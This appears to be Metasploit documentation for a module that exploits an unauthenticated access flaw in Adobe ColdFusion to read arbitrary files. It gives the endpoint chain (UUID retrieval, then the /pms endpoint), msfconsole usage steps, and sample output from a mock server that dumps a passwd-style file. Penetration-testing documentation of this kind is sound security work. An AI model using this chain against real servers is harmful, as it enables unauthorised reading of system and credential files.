## Vulnerable Application
This module exploits an Improper Access Vulnerability in Adobe Coldfusion versions prior to version
'2023 Update 6' and '2021 Update 12'. The vulnerability allows unauthenticated attackers to request authentication
token in the form of a UUID from the /CFIDE/adminapi/_servermanager/servermanager.cfc endpoint. Using that
UUID attackers can hit the /pms endpoint in order to exploit the Arbitrary File Read Vulnerability.

### Setup

#TODO: Find out how to setup a vulnerable target and put those details here.

## Verification Steps

1. Start msfconsole
1. Do: `use coldfusion_pms_servlet_file_read`
1. Set the `RHOST` and datastore option
1. If the target host is running Windows, change the default `FILE_PATH` datastore options from `/tmp/passwd` to a file path that exists on Windows.
1. Run the module
1. Receive the contents of the `FILE_PATH` file 

## Scenarios
### Mock Python Server (not actually running ColdFusion)

#TODO: Update this with output from a real ColdFusion target 
```
msf6 auxiliary(gather/coldfusion_pms_servlet_file_read) > rexploit
[*] Reloading module...
[*] Running module against 127.0.0.1

[*] Attempting to retrieve UUID ...
[+] UUID found:
1c49c29a-f1c0-4ed0-9f9e-215f434c8a12
[*] Attempting to exploit directory traversal to read /tmp/test
[+] File content:
[
  null,
  root:x:0:0:root:/root:/bin/bash,
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,
  bin:x:2:2:bin:/bin:/usr/sbin/nologin,
  sys:x:3:3:sys:/dev:/usr/sbin/nologin,
  sync:x:4:65534:sync:/bin:/bin/sync,
  games:x:5:60:games:/usr/games:/usr/sbin/nologin,
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin,
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin,
  ]
[+] Results saved to: /Users/jheysel/.msf4/loot/20240403192500_default_127.0.0.1_coldfusion.file_475871.txt
[*] Auxiliary module execution completed
```